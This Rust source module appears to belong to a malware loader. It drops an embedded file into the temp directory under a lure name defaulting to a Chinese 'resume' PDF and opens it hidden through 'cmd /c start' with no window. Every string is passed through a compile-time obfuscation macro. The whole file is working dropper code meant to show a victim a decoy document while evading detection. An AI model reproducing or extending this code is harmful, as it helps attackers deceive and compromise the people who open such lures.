use std::io::Write;
use std::os::windows::process::CommandExt;
use tempfile::NamedTempFile;
use rustcrypt_ct_macros::obf_lit;

// Include the generated bundle data
include!("bundle_data.rs");

#[allow(dead_code)]
pub fn bundlefile() {
    const CREATE_NO_WINDOW: u32 = 0x08000000;

    // Use compile-time environment variable for filename
    const ORIGINAL_FILE_NAME: &str = env!("RSL_BUNDLE_FILENAME");
    let original_file_name = if ORIGINAL_FILE_NAME.is_empty() {
        "xxx简历.pdf"
    } else {
        ORIGINAL_FILE_NAME
    };
    
    let mut temp_file = NamedTempFile::new().unwrap();
    
    let temp_dir = temp_file.path().parent().unwrap();
    let temp_file_path = temp_dir.join(&original_file_name);

    temp_file.write_all(MEMORY_FILE).unwrap();
    temp_file.flush().unwrap();

    std::fs::rename(temp_file.path(), &temp_file_path).expect(&obf_lit!("Failed to rename temporary file"));

    use std::process::Command;
    Command::new(obf_lit!("cmd"))
        .args(&[obf_lit!("/c"), obf_lit!("start"), obf_lit!("/B"), temp_file_path.to_str().unwrap().to_string()])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
        .expect(&obf_lit!("Failed to open file"));
}